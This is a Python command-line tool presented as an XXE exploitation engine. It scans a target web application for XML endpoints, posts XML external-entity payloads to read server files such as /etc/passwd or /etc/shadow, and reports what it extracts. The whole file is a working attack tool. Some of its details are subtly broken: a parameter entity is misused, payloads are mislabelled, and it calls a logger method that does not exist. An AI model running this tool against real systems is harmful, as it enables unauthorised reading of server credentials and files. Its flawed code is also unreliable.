#!/usr/bin/env python3

import argparse
import logging
import sys
import time
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

import requests
from requests.adapters import HTTPAdapter
from requests.exceptions import (
    ConnectionError,
    HTTPError,
    RequestException,
    Timeout,
)
from urllib3.util.retry import Retry


class VulnerabilityType(Enum):
    """Enumeration of XXE vulnerability types."""

    CLASSIC_XXE = "classic_xxe"
    BLIND_XXE = "blind_xxe"
    ERROR_BASED_XXE = "error_based_xxe"
    PARAMETER_ENTITY_XXE = "parameter_entity_xxe"


class PayloadCategory(Enum):
    """Categorization of XXE payloads by exploitation method."""

    DIRECT_FILE_ACCESS = "direct_file_access"
    OUT_OF_BAND = "out_of_band"
    ERROR_DISCLOSURE = "error_disclosure"
    PARAMETER_ENTITY = "parameter_entity"


@dataclass
class ExploitPayload:
    """Data structure representing an XXE exploitation payload."""

    name: str
    category: PayloadCategory
    vulnerability_type: VulnerabilityType
    xml_content: str
    target_file: str
    description: str
    content_type: str = "application/xml"

    def __post_init__(self) -> None:
        """Validate payload after initialization."""
        if not self.xml_content.strip():
            raise ValueError("XML content cannot be empty")
        if not self.target_file.strip():
            raise ValueError("Target file path cannot be empty")


class XXEExploitationEngine:
    """
    Professional XXE vulnerability exploitation engine.

    This class provides comprehensive XXE testing capabilities with
    multiple payload variants and professional error handling.
    """

    def __init__(
        self,
        base_url: str,
        timeout: int = 30,
        max_retries: int = 3,
        verify_ssl: bool = True
    ) -> None:
        """
        Initialize the XXE exploitation engine.

        Args:
            base_url: Target application base URL
            timeout: Request timeout in seconds
            max_retries: Maximum number of request retries
            verify_ssl: Whether to verify SSL certificates
        """
        self.base_url = self._normalize_base_url(base_url)
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = self._create_session(max_retries)
        self.logger = self._configure_logger()
        self.exploitation_results: List[Dict] = []

    def _normalize_base_url(self, url: str) -> str:
        """Normalize and validate the base URL."""
        if not url.startswith(('http://', 'https://')):
            url = f'http://{url}'

        parsed = urlparse(url)
        if not parsed.netloc:
            raise ValueError(f"Invalid URL format: {url}")

        return url.rstrip('/')

    def _create_session(self, max_retries: int) -> requests.Session:
        """Create a configured requests session with retry strategy."""
        session = requests.Session()

        retry_strategy = Retry(
            total=max_retries,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "PUT", "DELETE"]
        )

        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)

        # Set professional user agent
        session.headers.update({
            'User-Agent': 'XXE-Security-Assessment-Tool/1.0.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })

        return session

    def _configure_logger(self) -> logging.Logger:
        """Configure professional logging setup."""
        logger = logging.getLogger(__name__)
        logger.setLevel(logging.INFO)

        if not logger.handlers:
            handler = logging.StreamHandler(sys.stdout)
            formatter = logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            )
            handler.setFormatter(formatter)
            logger.addHandler(handler)

        return logger

    def generate_payloads(self, target_file: str = "/etc/passwd") -> List[ExploitPayload]:
        """
        Generate comprehensive XXE exploitation payloads.

        Args:
            target_file: Target file path to extract

        Returns:
            List of exploitation payloads
        """
        payloads = [
            ExploitPayload(
                name="Classic DTD XXE",
                category=PayloadCategory.DIRECT_FILE_ACCESS,
                vulnerability_type=VulnerabilityType.CLASSIC_XXE,
                target_file=target_file,
                description="Standard XXE with external DTD declaration",
                xml_content=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<root>
    <data>&xxe;</data>
</root>'''
            ),
            ExploitPayload(
                name="Parameter Entity XXE",
                category=PayloadCategory.PARAMETER_ENTITY,
                vulnerability_type=VulnerabilityType.PARAMETER_ENTITY_XXE,
                target_file=target_file,
                description="XXE using parameter entities for bypassing filters",
                xml_content=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY % file SYSTEM "file://{target_file}">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'file:///tmp/xxe.txt'>">
    %eval;
    %exfiltrate;
]>
<root>
    <data>%file;</data>
</root>'''
            ),
            ExploitPayload(
                name="UTF-16 Encoded XXE",
                category=PayloadCategory.DIRECT_FILE_ACCESS,
                vulnerability_type=VulnerabilityType.CLASSIC_XXE,
                target_file=target_file,
                description="XXE with UTF-16 encoding to bypass WAF",
                xml_content=f'''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<root>
    <sensitive>&xxe;</sensitive>
</root>'''
            ),
            ExploitPayload(
                name="PHP Wrapper XXE",
                category=PayloadCategory.DIRECT_FILE_ACCESS,
                vulnerability_type=VulnerabilityType.CLASSIC_XXE,
                target_file=target_file,
                description="XXE using PHP expect wrapper (if enabled)",
                xml_content=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={target_file}">
]>
<root>
    <data>&xxe;</data>
</root>'''
            ),
            ExploitPayload(
                name="Billion Laughs Prevention XXE",
                category=PayloadCategory.ERROR_DISCLOSURE,
                vulnerability_type=VulnerabilityType.ERROR_BASED_XXE,
                target_file=target_file,
                description="XXE designed to trigger error messages",
                xml_content=f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file://{target_file}">
    <!ENTITY test "&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;">
]>
<root>
    <content>&test;</content>
</root>'''
            )
        ]

        return payloads

    def discover_endpoints(self) -> List[str]:
        """
        Discover potential XXE-vulnerable endpoints.

        Returns:
            List of discovered endpoints
        """
        common_endpoints = [
            "/",
            "/upload",
            "/api/xml",
            "/process",
            "/submit",
            "/parse",
            "/import",
            "/data",
            "/xml",
            "/feed"
        ]

        discovered_endpoints = []

        for endpoint in common_endpoints:
            try:
                url = urljoin(self.base_url, endpoint)
                response = self.session.get(
                    url,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )

                if response.status_code == 200:
                    discovered_endpoints.append(endpoint)
                    self.logger.info(f"Discovered accessible endpoint: {endpoint}")

            except RequestException as e:
                self.logger.debug(f"Endpoint {endpoint} not accessible: {e}")
                continue

        return discovered_endpoints or ["/"]  # Default to root if none found

    def test_payload_on_endpoint(
        self,
        payload: ExploitPayload,
        endpoint: str
    ) -> Tuple[bool, Optional[str], Dict]:
        """
        Test a specific payload against an endpoint.

        Args:
            payload: The XXE payload to test
            endpoint: Target endpoint path

        Returns:
            Tuple of (success, extracted_content, response_metadata)
        """
        url = urljoin(self.base_url, endpoint)

        headers = {
            'Content-Type': payload.content_type,
            'Accept': 'application/xml,text/xml,*/*'
        }

        try:
            self.logger.info(f"Testing {payload.name} on {endpoint}")

            response = self.session.post(
                url,
                data=payload.xml_content,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            response_metadata = {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'response_time': response.elapsed.total_seconds(),
                'content_length': len(response.content)
            }

            # Analyze response for XXE exploitation indicators
            success, extracted_content = self._analyze_response(
                response, payload.target_file
            )

            return success, extracted_content, response_metadata

        except (ConnectionError, Timeout) as e:
            self.logger.error(f"Connection error testing {payload.name}: {e}")
            return False, None, {'error': str(e)}

        except HTTPError as e:
            self.logger.error(f"HTTP error testing {payload.name}: {e}")
            return False, None, {'error': str(e)}

        except Exception as e:
            self.logger.error(f"Unexpected error testing {payload.name}: {e}")
            return False, None, {'error': str(e)}

    def _analyze_response(
        self,
        response: requests.Response,
        target_file: str
    ) -> Tuple[bool, Optional[str]]:
        """
        Analyze HTTP response for XXE exploitation indicators.

        Args:
            response: HTTP response object
            target_file: Expected target file path

        Returns:
            Tuple of (exploitation_successful, extracted_content)
        """
        response_text = response.text.lower()
        target_indicators = [
            'root:x:0:0:root',  # /etc/passwd signature
            'daemon:x:',
            'bin:x:',
            'sys:x:',
            '/bin/bash',
            '/bin/sh'
        ]

        # Check for direct file content extraction
        for indicator in target_indicators:
            if indicator in response_text:
                self.logger.success(
                    f"XXE exploitation successful! Found {target_file} content"
                )
                return True, response.text

        # Check for error-based information disclosure
        error_indicators = [
            'java.io.filenotfoundexception',
            'permission denied',
            'no such file',
            'access denied',
            'xml parsing error'
        ]

        for error in error_indicators:
            if error in response_text:
                self.logger.warning(f"Potential XXE detected via error: {error}")
                return True, response.text

        return False, None

    def execute_comprehensive_exploitation(self, target_file: str = "/etc/passwd") -> Dict:
        """
        Execute comprehensive XXE exploitation testing.

        Args:
            target_file: Target file to extract

        Returns:
            Comprehensive exploitation results
        """
        self.logger.info("Starting comprehensive XXE exploitation assessment")

        # Discover available endpoints
        endpoints = self.discover_endpoints()
        self.logger.info(f"Testing {len(endpoints)} endpoints")

        # Generate payloads
        payloads = self.generate_payloads(target_file)
        self.logger.info(f"Generated {len(payloads)} exploitation payloads")

        results = {
            'target_url': self.base_url,
            'target_file': target_file,
            'total_tests': len(endpoints) * len(payloads),
            'successful_exploitations': [],
            'failed_attempts': [],
            'discovered_endpoints': endpoints,
            'timestamp': time.time()
        }

        # Test each payload against each endpoint
        for endpoint in endpoints:
            for payload in payloads:
                success, content, metadata = self.test_payload_on_endpoint(
                    payload, endpoint
                )

                exploitation_result = {
                    'endpoint': endpoint,
                    'payload_name': payload.name,
                    'payload_category': payload.category.value,
                    'vulnerability_type': payload.vulnerability_type.value,
                    'success': success,
                    'extracted_content': content if success else None,
                    'response_metadata': metadata,
                    'timestamp': time.time()
                }

                if success:
                    results['successful_exploitations'].append(exploitation_result)
                    self.logger.info(
                        f"✓ Successful exploitation: {payload.name} on {endpoint}"
                    )
                else:
                    results['failed_attempts'].append(exploitation_result)
                    self.logger.debug(
                        f"✗ Failed exploitation: {payload.name} on {endpoint}"
                    )

                # Rate limiting to avoid overwhelming the target
                time.sleep(0.5)

        self._generate_exploitation_report(results)
        return results

    def _generate_exploitation_report(self, results: Dict) -> None:
        """Generate a comprehensive exploitation report."""
        successful_count = len(results['successful_exploitations'])
        total_count = results['total_tests']

        self.logger.info("=" * 60)
        self.logger.info("XXE EXPLOITATION ASSESSMENT REPORT")
        self.logger.info("=" * 60)
        self.logger.info(f"Target URL: {results['target_url']}")
        self.logger.info(f"Target File: {results['target_file']}")
        self.logger.info(f"Total Tests: {total_count}")
        self.logger.info(f"Successful Exploitations: {successful_count}")
        self.logger.info(f"Success Rate: {(successful_count/total_count)*100:.1f}%")

        if successful_count > 0:
            self.logger.info("\nSUCCESSFUL EXPLOITATIONS:")
            for exploit in results['successful_exploitations']:
                self.logger.info(
                    f"  ✓ {exploit['payload_name']} on {exploit['endpoint']}"
                )

        self.logger.info("=" * 60)

def configure_argument_parser() -> argparse.ArgumentParser:
    """Configure and return the argument parser."""
    parser = argparse.ArgumentParser(
        description="Professional XXE Vulnerability Exploitation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --url http://localhost:8080
  %(prog)s --url https://target.com --target-file /etc/shadow --timeout 60
  %(prog)s --url http://192.168.1.100:8000 --no-ssl-verify --verbose
        """
    )

    parser.add_argument(
        '--url', '-u',
        required=True,
        help='Target application URL'
    )

    parser.add_argument(
        '--target-file', '-f',
        default='/etc/passwd',
        help='Target file to extract (default: /etc/passwd)'
    )

    parser.add_argument(
        '--timeout', '-t',
        type=int,
        default=30,
        help='Request timeout in seconds (default: 30)'
    )

    parser.add_argument(
        '--no-ssl-verify',
        action='store_false',
        dest='verify_ssl',
        help='Disable SSL certificate verification'
    )

    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Enable verbose logging'
    )

    return parser

def main() -> int:
    """Main execution function."""
    parser = configure_argument_parser()
    args = parser.parse_args()

    # Configure logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    try:
        # Initialize the exploitation engine
        engine = XXEExploitationEngine(
            base_url=args.url,
            timeout=args.timeout,
            verify_ssl=args.verify_ssl
        )

        # Execute comprehensive exploitation
        results = engine.execute_comprehensive_exploitation(args.target_file)

        # Determine exit code based on results
        if results['successful_exploitations']:
            print(f"\n[CRITICAL] XXE vulnerability confirmed! "
                  f"Successfully exploited {len(results['successful_exploitations'])} times.")
            return 2  # Vulnerability found
        else:
            print(f"\n[INFO] No XXE vulnerabilities detected in {results['total_tests']} tests.")
            return 0  # No vulnerabilities found

    except KeyboardInterrupt:
        print("\n[INFO] Exploitation interrupted by user.")
        return 130

    except Exception as e:
        print(f"[ERROR] Exploitation failed: {e}")
        return 1


if __name__ == '__main__':
    sys.exit(main())
